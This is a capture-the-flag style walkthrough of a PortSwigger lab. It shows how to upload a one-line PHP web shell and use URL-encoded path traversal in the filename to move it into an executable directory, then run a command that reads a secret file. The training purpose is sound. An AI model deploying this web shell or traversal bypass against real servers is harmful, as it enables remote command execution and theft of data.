---
Category: File upload
LAB: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal
Difficulty: Practitioner
Featured:
---

---

# Information / Description
This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a [secondary vulnerability](https://portswigger.net/web-security/file-path-traversal).

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

---

# Walkthrough

![](../../../0.%20Assets/Web%20shell%20upload%20via%20path%20traversal-1784714533763.webp)

This is what we encounter when we enter the lab, let's start by logging in with the credentials we where given.


![](../../../0.%20Assets/Web%20shell%20upload%20via%20path%20traversal-1784714562543.webp)

I even updated the email and we see an `avatar` upload functionality let's try uploading a `web shell`

```
<?php system($_GET['cmd']); ?>
```

![](../../../0.%20Assets/Web%20shell%20upload%20via%20path%20traversal-1784714721496.webp)

And here we have the request.

![](../../../0.%20Assets/Web%20shell%20upload%20via%20path%20traversal-1784714760590.webp)

![](../../../0.%20Assets/Web%20shell%20upload%20via%20path%20traversal-1784714789815.webp)
It say's it's okay let's see if we can open the file

If we right click the image and open URL in browser

![](../../../0.%20Assets/Web%20shell%20upload%20via%20path%20traversal-1784714866852.webp)

Looks like it is just displaying the file as text and not executing the file itself. Another thing we see is that a new directory appears

![](../../../0.%20Assets/Web%20shell%20upload%20via%20path%20traversal-1784714918492.webp)

`/files` this is interesting because in the query it didn't appear, and looks like `/avatars` has some kind of security in place for not executing code.

What if we upload the file to another directory, let's see if that security measure is still in place.

Let's send it to the repeater to tinker with it.

![](../../../0.%20Assets/Web%20shell%20upload%20via%20path%20traversal-1784715005398.webp)

With some small `directory traversal` I tried uploading it to `/files` let's see if we where lucky traversing to `/files/carlos2.php`

![](../../../0.%20Assets/Web%20shell%20upload%20via%20path%20traversal-1784715043308.webp)


Hmm okay, let's see what is going on

![](../../../0.%20Assets/Web%20shell%20upload%20via%20path%20traversal-1784715104279.webp)

okay so it doesn't show the traversal, so maybe there is another security measure in place

let's `URL encode` the traversal to try to bypass this security measure

We can do this in the `decoder`

![](../../../0.%20Assets/Web%20shell%20upload%20via%20path%20traversal-1784715189187.webp)

![](../../../0.%20Assets/Web%20shell%20upload%20via%20path%20traversal-1784715211537.webp)

Bingo! let's test our luck now

![](../../../0.%20Assets/Web%20shell%20upload%20via%20path%20traversal-1784716425902.webp)

And okay this is new, let's pass the parameter and see if it works

```
?cmd = cat /home/carlos/secret
```

![](../../../0.%20Assets/Web%20shell%20upload%20via%20path%20traversal-1784716494381.webp)

And now we just upload the flag

```
IFlUMMRFJ5a5J6WkvLkxQ3qBCK5GtSkX
```

![](../../../0.%20Assets/Web%20shell%20upload%20via%20path%20traversal-1784716520075.webp)